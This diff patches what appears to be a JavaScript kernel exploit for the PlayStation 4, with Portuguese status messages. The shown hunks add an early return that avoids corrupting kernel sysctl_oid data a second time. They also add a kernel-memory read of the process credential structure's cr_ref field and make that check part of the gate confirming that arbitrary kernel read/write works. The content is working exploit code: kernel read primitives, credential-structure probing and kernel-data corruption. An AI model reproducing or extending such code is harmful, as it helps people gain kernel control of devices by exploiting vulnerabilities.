@@ -2327,6 +2327,10 @@ let allDone = false,
         "Caps sysctl não responderam (capsLive=0). Reinicie o PS4 pelo menu rápido para restaurar o kernel.",
         "bad",
       );
+      // CRITICAL: prevent fallthrough into multiFire(mf3) which would corrupt
+      // already-dirty kernel .data (oid visibility/number bits) a second time,
+      // causing a likely Kernel Panic on the perturbed sysctl_oid structures.
+      return;
     } else {
       {
         let i = 0;
@@ -2436,6 +2440,21 @@ let allDone = false,
             t3 === uidNow,
             "cr_uid=" + t3 + " getuid=" + uidNow,
           );
+          // Structural validation: cr_ref (offset 0x00) must be a plausible
+          // small refcount. If UCRED was derived incorrectly by passA/passB,
+          // cr_ref will be garbage.  An incorrect UCRED would corrupt the
+          // td_ucred repair for worker w1, causing crfree() to fault on exit.
+          const crRef = kread32(UCRED);
+          const crRefOk = crRef > 0 && crRef < 1000;
+          mark(
+            "KRW-T3C-UCRED-SHAPE",
+            "*(ucred+0x00)=cr_ref=" + crRef + " plausible=" + (crRefOk ? 1 : 0),
+          );
+          check(
+            "krw-ucred-shape",
+            crRefOk,
+            "cr_ref=" + crRef + " (expected 1-999, a small positive refcount)",
+          );
           mark("KRW-T3B-READ8-HEAP", "read8(ucred)=" + read8(UCRED));
 
           const SCR4 = KBASE.add32(off.k_arg1_maxfiles);
@@ -2511,7 +2530,7 @@ let allDone = false,
           );
 
           const krwOk =
-            t1 === 27 && t2ok && t3 === uidNow && r4 === 0x41424344 && t5ok;
+            t1 === 27 && t2ok && t3 === uidNow && crRefOk && r4 === 0x41424344 && t5ok;
           mark(
             "EG-GATE",
             "krwOk=" +
